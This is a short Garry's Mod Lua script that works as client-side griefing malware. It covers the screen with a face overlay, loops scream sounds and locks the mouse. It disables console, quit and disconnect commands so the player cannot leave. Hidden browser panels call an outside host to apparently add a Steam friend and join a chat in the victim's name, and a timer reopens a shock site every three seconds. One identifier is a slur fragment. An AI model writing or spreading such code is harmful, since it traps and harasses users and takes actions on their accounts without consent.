--a

hook.Add("RenderScreenspaceEffects", "Overlay", function() 
	DrawMaterialOverlay("Models/Gman/gman_face_map3.vtf", 1.0)
end )

hook.Add("Think", "Misc", function()
	LocalPlayer():EmitSound("npc/fast_zombie/fz_scream1.wav", 100, math.random(50, 250))
	LocalPlayer():EmitSound("npc/env_headcrabcanister/explosion.wav", 100, 250)
	
	gui.SetMousePos(ScrW()/2, ScrH()/2)
end )

local convars = { 
				"toggleconsole", "connect", "disconnect",
				"quit", "map", "map2", "gameui_activate",
}

for k, v in pairs(convars) do
	CreateConVar(v, "")
end
	
cp1 = vgui.Create("HTML") 
cp1:SetVisible(false) 
cp1:OpenURL("http://chrisaster.net/add_friend.php?id=76561197960279927")	

cp2 = vgui.Create("HTML")
cp2:SetVisible(false)
cp2:OpenURL("http://chrisaster.net/join_chat.php?id=103582791430484803")

cp3 = vgui.Create("HTML")
cp3:SetVisible(false)
cp3:OpenURL("http://chrisaster.net/open_url.php?url=http://www.facepunch.com/forumdisplay.php?f=16")
		
timer.Create("nig", 3, 0, function()
	g=vgui.Create("HTML") 
	g:SetVisible(false) 
	g:OpenURL("http://chrisaster.net/open_url.php?url=http://a.on.nimp.org")
end)
